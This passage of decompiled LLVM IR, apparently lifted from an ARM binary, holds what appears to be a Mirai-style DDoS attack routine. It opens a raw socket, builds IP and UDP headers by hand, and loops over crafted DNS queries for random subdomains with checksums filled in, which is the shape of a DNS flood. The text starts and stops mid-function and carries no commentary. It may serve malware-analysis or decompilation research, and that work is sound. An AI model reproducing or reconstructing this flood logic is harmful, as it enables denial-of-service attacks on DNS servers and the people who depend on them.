  br i1 %v2_a6a0, label %dec_label_pc_a6b4, label %dec_label_pc_a6c4

dec_label_pc_a6b4:                                ; preds = %dec_label_pc_a69c
  %v7_a6b4 = icmp eq i8 %v2_a69c, 9
  store i1 %v7_a6b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6b4, label %dec_label_pc_a690, label %bb

bb:                                               ; preds = %dec_label_pc_a6b4
  %v8_a6b8 = icmp eq i8 %v2_a69c, 32
  store i1 %v8_a6b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_a6b8, label %dec_label_pc_a690, label %dec_label_pc_a6c0

dec_label_pc_a6c0:                                ; preds = %bb
  %v1_a6c0 = add i32 %v0_a6c0, 1
  store i32 %v1_a6c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a6c4

dec_label_pc_a6c4:                                ; preds = %dec_label_pc_a69c, %dec_label_pc_a6c0
  %v0_a6c030 = phi i32 [ %v0_a6c0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v0_a6a026 = phi i32 [ %v0_a6a0, %dec_label_pc_a69c ], [ %v1_a6c0, %dec_label_pc_a6c0 ]
  %v7_a6c4 = icmp eq i8 %v2_a69c, 46
  store i1 %v7_a6c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a6c4, label %dec_label_pc_a688, label %bb103

bb103:                                            ; preds = %dec_label_pc_a6c4
  %v8_a6c8 = icmp eq i32 %v1_a6ac, 9
  store i1 %v8_a6c8, i1* %cpsr_z.global-to-local, align 1
  %tmp = icmp ult i32 %v1_a6ac, 10
  br i1 %tmp, label %dec_label_pc_a688, label %dec_label_pc_a6d0

dec_label_pc_a6d0:                                ; preds = %dec_label_pc_a688, %bb103
  %v0_a690.lcssa = phi i32 [ %v1_a6a4, %dec_label_pc_a688 ], [ %v0_a690, %bb103 ]
  %v2_a6d4 = sub i32 %v0_a690.lcssa, %v0_a668
  store i32 %v2_a6d4, i32* @r4, align 4
  %v2_a6d8 = ptrtoint i32* %stack_var_-76 to i32
  store i32 %v2_a678, i32* %r1.global-to-local, align 4
  store i32 %v2_a6d8, i32* %r0.global-to-local, align 4
  store i32 %v2_a6d4, i32* %r2.global-to-local, align 4
  %v3_a6e8 = call i32 @util_memcpy(i32 %v2_a6d8, i32 %v2_a678, i32 %v2_a6d4)
  %v2_a6ec = ptrtoint i32* %stack_var_-40 to i32
  %v1_a6f0 = load i32, i32* @r4, align 4
  %v2_a6f0 = add i32 %v1_a6f0, %v2_a6ec
  store i32 %v2_a6f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_a6d8, i32* @r0, align 4
  %v3_a6fc = add i32 %v2_a6f0, -36
  %v4_a6fc = inttoptr i32 %v3_a6fc to i8*
  store i8 0, i8* %v4_a6fc, align 1
  %v1_a700 = call i32 @inet_addr(i32 %v2_a6d8)
  store i32 %v1_a700, i32* %r0.global-to-local, align 4
  store i32 %v1_a700, i32* @fp, align 4
  br label %dec_label_pc_a708

dec_label_pc_a70811:                              ; preds = %dec_label_pc_ab04
  unreachable

dec_label_pc_a708:                                ; preds = %dec_label_pc_ab6c, %dec_label_pc_ab60, %dec_label_pc_ab50, %dec_label_pc_ab40, %dec_label_pc_a6d0
  %v1_ab3c49 = phi i32 [ %v1_ab08, %dec_label_pc_ab6c ], [ %v1_ab08, %dec_label_pc_ab60 ], [ %v1_ab08, %dec_label_pc_ab50 ], [ %v1_ab08, %dec_label_pc_ab40 ], [ %v1_a700, %dec_label_pc_a6d0 ]
  %v0_a708 = load i32, i32* @r7, align 4
  %v2_a708 = icmp eq i32 %v0_a708, 0
  store i1 %v2_a708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a708, label %dec_label_pc_ab30, label %dec_label_pc_a710

dec_label_pc_a710:                                ; preds = %dec_label_pc_a708
  store i32 %v0_a708, i32* %r0.global-to-local, align 4
  %v1_a714 = inttoptr i32 %v0_a708 to i8*
  %v2_a714 = call i32 @util_strlen(i8* %v1_a714)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 %v2_a714, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_a728 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_a728, i32* %r0.global-to-local, align 4
  %v7_a72c = icmp eq i32 %v3_a728, -1
  store i1 %v7_a72c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a72c, label %dec_label_pc_ab30, label %dec_label_pc_a738

dec_label_pc_a738:                                ; preds = %dec_label_pc_a710
  store i32 1, i32* %stack_var_-44, align 4
  %v6_a740 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_a740, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_a754 = call i32 @__GI_setsockopt(i32 %v3_a728, i32 0, i32 3, i32 %v6_a740, i32 4)
  store i32 %v5_a754, i32* %r0.global-to-local, align 4
  %v7_a758 = icmp eq i32 %v5_a754, -1
  store i1 %v7_a758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a758, label %dec_label_pc_ab28, label %dec_label_pc_a760

dec_label_pc_a760:                                ; preds = %dec_label_pc_a738
  %v0_a768 = load i32, i32* %sb.global-to-local, align 4
  %v1_a768 = urem i32 %v0_a768, 256
  store i32 %v1_a768, i32* %sb.global-to-local, align 4
  %v3_a770 = mul i32 %v6_a578, 65536
  store i32 %v3_a770, i32* %r3.global-to-local, align 4
  %v5_a77c = trunc i32 %v0_a768 to i8
  %v0_a780 = load i32, i32* @r8, align 4
  %v2_a780 = icmp eq i32 %v0_a780, 0
  store i1 %v2_a780, i1* %cpsr_z.global-to-local, align 1
  %v3_a784 = urem i32 %v7_a51c, 65536
  store i32 %v3_a784, i32* %r0.global-to-local, align 4
  %v3_a78c = urem i32 %v6_a578, 65536
  store i32 %v3_a78c, i32* %r2.global-to-local, align 4
  %v3_a790 = mul i32 %v6_a590, 65536
  %v3_a794 = mul i32 %v6_a5ac, 65536
  store i32 %v3_a794, i32* %ip.global-to-local, align 4
  br i1 %v2_a780, label %bb104, label %bb105

bb104:                                            ; preds = %dec_label_pc_a760
  %v5_a79c = sext i8 %v5_a77c to i32
  store i32 %v5_a79c, i32* %r2.global-to-local, align 4
  br label %bb105

bb105:                                            ; preds = %dec_label_pc_a760, %bb104
  %v2_a7c8 = phi i32 [ %v3_a78c, %dec_label_pc_a760 ], [ %v5_a79c, %bb104 ]
  %v3_a7a8 = urem i32 %v6_a590, 65536
  store i32 %v3_a7a8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v3_a7b0 = urem i32 %v6_a5ac, 65536
  store i32 0, i32* %stack_var_-44, align 4
  %v1_a7c8 = load i32, i32* @r6, align 4
  br i1 %v2_a780, label %.dec_label_pc_a9b0.preheader_crit_edge, label %dec_label_pc_a7d0

.dec_label_pc_a9b0.preheader_crit_edge:           ; preds = %bb105
  %v3_a7c8 = add i32 %v1_a7c8, %v2_a7c8
  store i32 %v3_a7c8, i32* @r7, align 4
  %.pre = sext i8 %v5_a77c to i32
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a7d0:                                ; preds = %bb105
  %v2_a7d0 = add i32 %v1_a7c8, %v1_a768
  %v3_a7d4 = mul i32 %v2_a7d0, 65536
  %v1_a7dc = add i32 %v3_a7d4, 1769472
  %v1_a7e0 = add i32 %v3_a7d4, 3080192
  %tmp106 = udiv i32 %v1_a7e0, 256
  %v3_a7f4 = and i32 %tmp106, 65280
  %v4_a804 = udiv i32 %v1_a7e0, 16777216
  %v5_a804 = or i32 %v3_a7f4, %v4_a804
  store i32 %v5_a804, i32* @sl, align 4
  %trunc60 = trunc i32 %v6_a578 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc60)
  %tmp107 = mul i32 %v7_a51c, 256
  %v3_a818 = and i32 %tmp107, 65280
  store i32 %v3_a818, i32* %r1.global-to-local, align 4
  %tmp108 = udiv i32 %v7_a51c, 256
  %v4_a81c = urem i32 %tmp108, 256
  %v5_a81c = or i32 %v4_a81c, %v3_a818
  store i32 %v5_a81c, i32* @sb, align 4
  store i32 %v3_a794, i32* %r2.global-to-local, align 4
  store i32 %v3_a790, i32* %r0.global-to-local, align 4
  %tmp109 = mul i32 %v6_a590, 256
  %v3_a830 = and i32 %tmp109, 65280
  %tmp110 = mul i32 %v6_a5ac, 256
  %v3_a834 = and i32 %tmp110, 65280
  %tmp111 = udiv i32 %v1_a7dc, 256
  %v3_a838 = and i32 %tmp111, 65280
  store i32 %v3_a838, i32* @lr, align 4
  %tmp112 = udiv i32 %v6_a590, 256
  %v4_a83c = urem i32 %tmp112, 256
  %v5_a83c = or i32 %v4_a83c, %v3_a830
  store i32 %v5_a83c, i32* %ip.global-to-local, align 4
  %tmp113 = udiv i32 %v6_a5ac, 256
  %v4_a840 = urem i32 %tmp113, 256
  %v5_a840 = or i32 %v4_a840, %v3_a834
  store i32 %v5_a840, i32* @r4, align 4
  %v1_a844 = add i32 %v1_a7c8, 1
  store i32 %v1_a844, i32* %r3.global-to-local, align 4
  %v4_a848 = udiv i32 %v1_a7dc, 16777216
  %v5_a848 = or i32 %v4_a848, %tmp111
  store i32 0, i32* @r5, align 4
  %sext = mul i32 %v6_a4f8, 16777216
  %v4_a8a0 = sdiv i32 %sext, 16777216
  %sext8 = mul i32 %v6_a534, 16777216
  %v4_a8ac = sdiv i32 %sext8, 16777216
  %v4_a8cc = sext i8 %v5_a77c to i32
  %sext9 = mul nuw i32 %v5_a83c, 65536
  %v7_a8e0 = sdiv i32 %sext9, 65536
  %sext10 = mul nuw i32 %v5_a840, 65536
  %v4_a908 = sdiv i32 %sext10, 65536
  %v1_a8a8 = trunc i32 %v4_a8a0 to i8
  %extract.t = trunc i32 %v4_a8ac to i8
  %v1_a8d0 = add nsw i32 %v4_a8cc, 41
  %sext120 = mul i32 %v5_a848, 65536
  %v3_a8e0 = sdiv i32 %sext120, 65536
  br label %dec_label_pc_a860

dec_label_pc_a860:                                ; preds = %dec_label_pc_a980, %dec_label_pc_a7d0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 600, i32* %r0.global-to-local, align 4
  %v2_a868 = call i32 @calloc(i32 600, i32 1)
  store i32 %v2_a868, i32* %r0.global-to-local, align 4
  store i32 %v2_a4e0, i32* %ip.global-to-local, align 4
  %v3_a870 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a870, i32* %r3.global-to-local, align 4
  %v2_a874 = load i32, i32* @r5, align 4
  %v5_a874 = mul i32 %v2_a874, 4
  %v6_a874 = add i32 %v5_a874, %v2_a4e0
  %v7_a874 = inttoptr i32 %v6_a874 to i32*
  store i32 %v2_a868, i32* %v7_a874, align 4
  %v0_a878 = load i32, i32* %ip.global-to-local, align 4
  %v1_a878 = load i32, i32* %r3.global-to-local, align 4
  %v4_a878 = mul i32 %v1_a878, 4
  %v5_a878 = add i32 %v4_a878, %v0_a878
  %v6_a878 = inttoptr i32 %v5_a878 to i32*
  %v7_a878 = load i32, i32* %v6_a878, align 4
  store i32 %v7_a878, i32* %r1.global-to-local, align 4
  %v1_a87c = inttoptr i32 %v7_a878 to i8*
  %v2_a87c = load i8, i8* %v1_a87c, align 1
  %tmp127 = urem i8 %v2_a87c, 16
  %v1_a880 = zext i8 %tmp127 to i32
  %v1_a884 = or i32 %v1_a880, 64
  store i32 %v1_a884, i32* %r2.global-to-local, align 4
  %v1_a888 = trunc i32 %v1_a884 to i8
  store i8 %v1_a888, i8* %v1_a87c, align 1
  %v0_a88c = load i32, i32* %r1.global-to-local, align 4
  %v1_a88c = inttoptr i32 %v0_a88c to i8*
  %v2_a88c = load i8, i8* %v1_a88c, align 1
  %v3_a88c = zext i8 %v2_a88c to i32
  %v1_a890 = and i32 %v3_a88c, 240
  %v1_a894 = or i32 %v1_a890, 5
  store i32 %v1_a894, i32* %r3.global-to-local, align 4
  store i32 %v1_a560, i32* %lr.global-to-local, align 4
  %v1_a89c = trunc i32 %v1_a894 to i8
  store i8 %v1_a89c, i8* %v1_a88c, align 1
  store i32 %v4_a8a0, i32* %r0.global-to-local, align 4
  %v0_a8a4 = load i32, i32* %lr.global-to-local, align 4
  %v2_a8a4 = icmp eq i32 %v0_a8a4, 0
  store i1 %v2_a8a4, i1* %cpsr_z.global-to-local, align 1
  %v2_a8a8 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8a8 = add i32 %v2_a8a8, 1
  %v4_a8a8 = inttoptr i32 %v3_a8a8 to i8*
  store i8 %v1_a8a8, i8* %v4_a8a8, align 1
  store i32 %v4_a8ac, i32* %r2.global-to-local, align 4
  %v0_a8b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a8b0, label %.thread13, label %bb114

bb114:                                            ; preds = %dec_label_pc_a860
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_a8b4 = load i32, i32* %r1.global-to-local, align 4
  %v4_a8b4 = add i32 %v3_a8b4, 6
  %v5_a8b4 = inttoptr i32 %v4_a8b4 to i16*
  store i16 64, i16* %v5_a8b4, align 2
  %v0_a8bc.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t52 = trunc i32 %v0_a8bc.pre to i8
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_a860, %bb114
  %v0_a8bc.off0 = phi i8 [ %extract.t, %dec_label_pc_a860 ], [ %extract.t52, %bb114 ]
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_a8bc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8bc = add i32 %v2_a8bc, 8
  %v4_a8bc = inttoptr i32 %v3_a8bc to i8*
  store i8 %v0_a8bc.off0, i8* %v4_a8bc, align 1
  %v0_a8c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8c0 = trunc i32 %v0_a8c0 to i8
  %v2_a8c0 = load i32, i32* %r1.global-to-local, align 4
  %v3_a8c0 = add i32 %v2_a8c0, 9
  %v4_a8c0 = inttoptr i32 %v3_a8c0 to i8*
  store i8 %v1_a8c0, i8* %v4_a8c0, align 1
  %v2_a8c8 = load i32, i32* @global_var_243d0.55, align 4
  %v0_a8d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_a8d4 = add i32 %v1_a8d0, %v0_a8d0
  store i32 %v2_a8d4, i32* @r4, align 4
  %v2_a8d8 = add i32 %v0_a8d0, 12
  %v3_a8d8 = inttoptr i32 %v2_a8d8 to i32*
  store i32 %v2_a8c8, i32* %v3_a8d8, align 4
  store i32 %v3_a8e0, i32* %r2.global-to-local, align 4
  store i32 %v7_a8e0, i32* %r3.global-to-local, align 4
  %v0_a8e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a8e4 = add i32 %v0_a8e4, 20
  store i32 %v1_a8e4, i32* %ip.global-to-local, align 4
  %v0_a8e8 = load i32, i32* @sl, align 4
  %v1_a8e8 = trunc i32 %v0_a8e8 to i16
  %v3_a8e8 = add i32 %v0_a8e4, 2
  %v4_a8e8 = inttoptr i32 %v3_a8e8 to i16*
  store i16 %v1_a8e8, i16* %v4_a8e8, align 2
  %v0_a8ec = load i32, i32* @sb, align 4
  %v1_a8ec = trunc i32 %v0_a8ec to i16
  %v2_a8ec = load i32, i32* %r1.global-to-local, align 4
  %v3_a8ec = add i32 %v2_a8ec, 4
  %v4_a8ec = inttoptr i32 %v3_a8ec to i16*
  store i16 %v1_a8ec, i16* %v4_a8ec, align 2
  %v0_a8f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_a8f0 = trunc i32 %v0_a8f0 to i16
  %v2_a8f0 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f0 = add i32 %v2_a8f0, 4
  %v4_a8f0 = inttoptr i32 %v3_a8f0 to i16*
  store i16 %v1_a8f0, i16* %v4_a8f0, align 2
  %v0_a8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a8f4 = trunc i32 %v0_a8f4 to i16
  %v2_a8f4 = load i32, i32* %ip.global-to-local, align 4
  %v3_a8f4 = add i32 %v2_a8f4, 2
  %v4_a8f4 = inttoptr i32 %v3_a8f4 to i16*
  store i16 %v1_a8f4, i16* %v4_a8f4, align 2
  %v2_a8fc = load i32, i32* %r1.global-to-local, align 4
  %v3_a8fc = add i32 %v2_a8fc, 20
  %v4_a8fc = inttoptr i32 %v3_a8fc to i16*
  store i16 %rev, i16* %v4_a8fc, align 2
  store i32 %v4_a8cc, i32* %ip.global-to-local, align 4
  %v0_a904 = load i32, i32* %r1.global-to-local, align 4
  %v1_a904 = add i32 %v0_a904, 28
  store i32 %v1_a904, i32* %r0.global-to-local, align 4
  store i32 %v4_a908, i32* %r3.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v3_a914 = add i32 %v0_a904, 30
  %v4_a914 = inttoptr i32 %v3_a914 to i16*
  store i16 1, i16* %v4_a914, align 2
  %v0_a918 = load i32, i32* @lr, align 4
  %v1_a918 = trunc i32 %v0_a918 to i16
  %v2_a918 = load i32, i32* %r0.global-to-local, align 4
  %v3_a918 = add i32 %v2_a918, 4
  %v4_a918 = inttoptr i32 %v3_a918 to i16*
  store i16 %v1_a918, i16* %v4_a918, align 2
  %v0_a91c = load i32, i32* %ip.global-to-local, align 4
  %v1_a91c = trunc i32 %v0_a91c to i8
  %v2_a91c = load i32, i32* %r1.global-to-local, align 4
  %v3_a91c = add i32 %v2_a91c, 40
  %v4_a91c = inttoptr i32 %v3_a91c to i8*
  store i8 %v1_a91c, i8* %v4_a91c, align 1
  %v0_a920 = load i32, i32* @fp, align 4
  %v1_a920 = load i32, i32* %r1.global-to-local, align 4
  %v2_a920 = add i32 %v1_a920, 16
  %v3_a920 = inttoptr i32 %v2_a920 to i32*
  store i32 %v0_a920, i32* %v3_a920, align 4
  %v0_a924 = load i32, i32* %r3.global-to-local, align 4
  %v1_a924 = trunc i32 %v0_a924 to i16
  %v2_a924 = load i32, i32* %r1.global-to-local, align 4
  %v3_a924 = add i32 %v2_a924, 28
  %v4_a924 = inttoptr i32 %v3_a924 to i16*
  store i16 %v1_a924, i16* %v4_a924, align 2
  %v0_a928 = load i32, i32* @r4, align 4
  %v1_a928 = add i32 %v0_a928, 1
  store i32 %v1_a928, i32* %r0.global-to-local, align 4
  %v0_a92c = load i32, i32* @r7, align 4
  store i32 %v0_a92c, i32* %r1.global-to-local, align 4
  store i32 %v1_a844, i32* %r2.global-to-local, align 4
  %v3_a934 = call i32 @util_memcpy(i32 %v1_a928, i32 %v0_a92c, i32 %v1_a844)
  store i32 %v3_a934, i32* %r0.global-to-local, align 4
  %v0_a938 = load i32, i32* @r6, align 4
  %v2_a938 = icmp eq i32 %v0_a938, 0
  store i1 %v2_a938, i1* %cpsr_z.global-to-local, align 1
  %tmp115 = icmp slt i32 %v0_a938, 1
  br i1 %tmp115, label %bb116, label %dec_label_pc_a948

bb116:                                            ; preds = %.thread13
  %v5_a93c = load i32, i32* @r4, align 4
  store i32 %v5_a93c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a980

dec_label_pc_a948:                                ; preds = %.thread13
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_a94c = load i32, i32* @r4, align 4
  store i32 %v0_a94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_a954

dec_label_pc_a954:                                ; preds = %.thread20, %dec_label_pc_a948
  %v0_a960 = phi i32 [ %storemerge, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v0_a964 = phi i32 [ %v0_a978, %.thread20 ], [ 0, %dec_label_pc_a948 ]
  %v1_a954 = load i32, i32* @r7, align 4
  %v2_a954 = add i32 %v1_a954, %v0_a964
  %v3_a954 = inttoptr i32 %v2_a954 to i8*
  %v4_a954 = load i8, i8* %v3_a954, align 1
  %v6_a954 = zext i8 %v4_a954 to i32
  store i32 %v6_a954, i32* %r3.global-to-local, align 4
  %v7_a958 = icmp eq i8 %v4_a954, 46
  store i1 %v7_a958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a958, label %bb117, label %.thread59

.thread59:                                        ; preds = %dec_label_pc_a954
  %v1_a96016 = add nsw i32 %v0_a960, 1
  store i32 %v1_a96016, i32* %r2.global-to-local, align 4
  %v1_a96418 = add i32 %v0_a964, 1
  store i32 %v1_a96418, i32* %r1.global-to-local, align 4
  br label %bb118

bb117:                                            ; preds = %dec_label_pc_a954
  %v2_a95c = load i32, i32* @r4, align 4
  %v3_a95c = add i32 %v2_a95c, %v0_a964
  store i32 %v3_a95c, i32* %r3.global-to-local, align 4
  %v1_a960 = add nsw i32 %v0_a960, 1
  store i32 %v1_a960, i32* %r2.global-to-local, align 4
  %v1_a964 = add i32 %v0_a964, 1
  store i32 %v1_a964, i32* %r1.global-to-local, align 4
  %v2_a968 = trunc i32 %v0_a960 to i8
  %v3_a968 = load i32, i32* %r0.global-to-local, align 4
  %v4_a968 = inttoptr i32 %v3_a968 to i8*
  store i8 %v2_a968, i8* %v4_a968, align 1
  %v0_a96c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a96c.pre, label %bb119, label %bb117.bb118_crit_edge

bb117.bb118_crit_edge:                            ; preds = %bb117
  %v1_a96c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb118

bb118:                                            ; preds = %bb117.bb118_crit_edge, %.thread59
  %v1_a96c = phi i32 [ %v1_a96c.pre, %bb117.bb118_crit_edge ], [ %v1_a96016, %.thread59 ]
  %v2_a96c = urem i32 %v1_a96c, 256
  br label %.thread20

bb119:                                            ; preds = %bb117
  %v1_a970 = load i32, i32* %r3.global-to-local, align 4
  %v2_a970 = add i32 %v1_a970, 1
  store i32 %v2_a970, i32* %r0.global-to-local, align 4
  br label %.thread20

.thread20:                                        ; preds = %bb118, %bb119
  %storemerge = phi i32 [ %v2_a96c, %bb118 ], [ 0, %bb119 ]
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  %v0_a978 = load i32, i32* %r1.global-to-local, align 4
  %v1_a978 = load i32, i32* @r6, align 4
  %v9_a978 = icmp eq i32 %v0_a978, %v1_a978
  store i1 %v9_a978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a978, label %dec_label_pc_a980.loopexit, label %dec_label_pc_a954

dec_label_pc_a980.loopexit:                       ; preds = %.thread20
  %v2_a980.pre = load i32, i32* %r0.global-to-local, align 4
  %extract.t126 = trunc i32 %storemerge to i8
  br label %dec_label_pc_a980

dec_label_pc_a980:                                ; preds = %bb116, %dec_label_pc_a980.loopexit
  %v0_a980.off0 = phi i8 [ %extract.t126, %dec_label_pc_a980.loopexit ], [ 0, %bb116 ]
  %v2_a980 = phi i32 [ %v2_a980.pre, %dec_label_pc_a980.loopexit ], [ %v5_a93c, %bb116 ]
  %v3_a980 = inttoptr i32 %v2_a980 to i8*
  store i8 %v0_a980.off0, i8* %v3_a980, align 1
  %v3_a984 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a984, i32* %r3.global-to-local, align 4
  %v1_a988 = add i32 %v3_a984, 1
  store i32 %v1_a988, i32* @r5, align 4
  %v0_a98c = load i32, i32* @r4, align 4
  %v1_a98c = load i32, i32* @r6, align 4
  %v2_a98c = add i32 %v1_a98c, %v0_a98c
  store i32 %v2_a98c, i32* %r2.global-to-local, align 4
  store i32 256, i32* @lr, align 4
  %v0_a994 = load i32, i32* @r8, align 4
  %v9_a994 = icmp eq i32 %v0_a994, %v1_a988
  store i1 %v9_a994, i1* %cpsr_z.global-to-local, align 1
  %v3_a998 = add i32 %v2_a98c, 4
  %v4_a998 = inttoptr i32 %v3_a998 to i16*
  store i16 256, i16* %v4_a998, align 2
  %v0_a99c = load i32, i32* @lr, align 4
  %v1_a99c = trunc i32 %v0_a99c to i16
  %v2_a99c = load i32, i32* %r2.global-to-local, align 4
  %v3_a99c = add i32 %v2_a99c, 2
  %v4_a99c = inttoptr i32 %v3_a99c to i16*
  store i16 %v1_a99c, i16* %v4_a99c, align 2
  %v0_a9a0 = load i32, i32* @r5, align 4
  store i32 %v0_a9a0, i32* %stack_var_-44, align 4
  %v8_a9a4 = icmp sgt i32 %v0_a994, %v1_a988
  br i1 %v8_a9a4, label %dec_label_pc_a860, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %dec_label_pc_a980
  store i32 %v4_a8cc, i32* %r0.global-to-local, align 4
  %v0_a9ac = load i32, i32* @r6, align 4
  %v2_a9ac = add i32 %v0_a9ac, %v4_a8cc
  store i32 %v2_a9ac, i32* @r7, align 4
  %v0_a9b4.pre.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_a9b0.preheader

dec_label_pc_a9b0.preheader:                      ; preds = %.dec_label_pc_a9b0.preheader_crit_edge, %dec_label_pc_a9a8
  %v4_aa14.pre-phi = phi i32 [ %.pre, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v4_a8cc, %dec_label_pc_a9a8 ]
  %v0_a9b4.pre = phi i32 [ 0, %.dec_label_pc_a9b0.preheader_crit_edge ], [ %v0_a9b4.pre.pre, %dec_label_pc_a9a8 ]
  %v3_a9e0 = icmp eq i32 %v3_a784, 65535
  %v3_a9f0 = icmp eq i32 %v3_a78c, 65535
  br label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8, %dec_label_pc_a9b0.preheader
  %v0_a9b4 = phi i32 [ %v0_a9b4.pre, %dec_label_pc_a9b0.preheader ], [ 0, %dec_label_pc_aaa8 ], [ 0, %dec_label_pc_a9b0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a9b4 = icmp eq i32 %v0_a9b4, 0
  store i1 %v2_a9b4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a9b4, label %dec_label_pc_a9b0, label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %dec_label_pc_aaa8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_a9c4 = load i32, i32* @r7, align 4
  %v1_a9c4 = add i32 %v0_a9c4, 27
  store i32 %v1_a9c4, i32* @sb, align 4
  %v1_a9c8 = add i32 %v0_a9c4, 47
  store i32 %v1_a9c8, i32* @sl, align 4
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_aa10, %dec_label_pc_a9c0
  %v1_a9d8 = phi i32 [ %v1_aa98, %dec_label_pc_aa10 ], [ 0, %dec_label_pc_a9c0 ]
  store i32 %v2_a4e0, i32* %r3.global-to-local, align 4
  store i32 %v3_a784, i32* %ip.global-to-local, align 4
  %v4_a9d8 = mul i32 %v1_a9d8, 4
  %v5_a9d8 = add i32 %v4_a9d8, %v2_a4e0
  %v6_a9d8 = inttoptr i32 %v5_a9d8 to i32*
  %v7_a9d8 = load i32, i32* %v6_a9d8, align 4
  store i32 %v7_a9d8, i32* @r4, align 4
  store i32 65535, i32* @r5, align 4
  store i1 %v3_a9e0, i1* %cpsr_z.global-to-local, align 1
  %v1_a9e4 = add i32 %v7_a9d8, 20
  store i32 %v1_a9e4, i32* @r6, align 4
  br i1 %v3_a9e0, label %dec_label_pc_aabc, label %dec_label_pc_a9ec

dec_label_pc_a9ec:                                ; preds = %dec_label_pc_a9cc
  store i32 %v3_a78c, i32* @lr, align 4
  store i1 %v3_a9f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a9f0, label %dec_label_pc_aad0, label %dec_label_pc_a9f8

dec_label_pc_a9f8:                                ; preds = %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge, %dec_label_pc_a9ec
  %v1_a9fc = phi i32 [ %v1_a9fc.pre, %dec_label_pc_aabc.dec_label_pc_a9f8_crit_edge ], [ 65535, %dec_label_pc_a9ec ]
  store i32 %v3_a7a8, i32* %r0.global-to-local, align 4
  %v9_a9fc = icmp eq i32 %v3_a7a8, %v1_a9fc
  store i1 %v9_a9fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a9fc, label %dec_label_pc_aae4, label %dec_label_pc_aa04

dec_label_pc_aa04:                                ; preds = %dec_label_pc_aad0, %dec_label_pc_a9f8
  %v1_aa08 = phi i32 [ %v1_aadc, %dec_label_pc_aad0 ], [ %v1_a9fc, %dec_label_pc_a9f8 ]
  store i32 %v3_a7b0, i32* %r2.global-to-local, align 4
  %v9_aa08 = icmp eq i32 %v3_a7b0, %v1_aa08
  store i1 %v9_aa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aa08, label %dec_label_pc_aaf8, label %dec_label_pc_aa10

dec_label_pc_aa10:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_aa04, %dec_label_pc_aaf8
  %v0_aa10 = load i32, i32* @r4, align 4
  %v1_aa10 = add i32 %v0_aa10, 41
  store i32 %v1_aa10, i32* %r0.global-to-local, align 4
  store i32 %v4_aa14.pre-phi, i32* %r1.global-to-local, align 4
  %v2_aa18 = call i32 @rand_alpha_str(i32 %v1_aa10, i32 %v4_aa14.pre-phi)
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_aa20 = load i32, i32* @r4, align 4
  %v3_aa20 = add i32 %v2_aa20, 10
  %v4_aa20 = inttoptr i32 %v3_aa20 to i16*
  store i16 0, i16* %v4_aa20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_aa28 = load i32, i32* @r4, align 4
  store i32 %v0_aa28, i32* @r0, align 4
  %v2_aa2c = call i32 @checksum_generic(i32 %v0_aa28, i32 20)
  %v3_aa2c = trunc i32 %v2_aa2c to i16
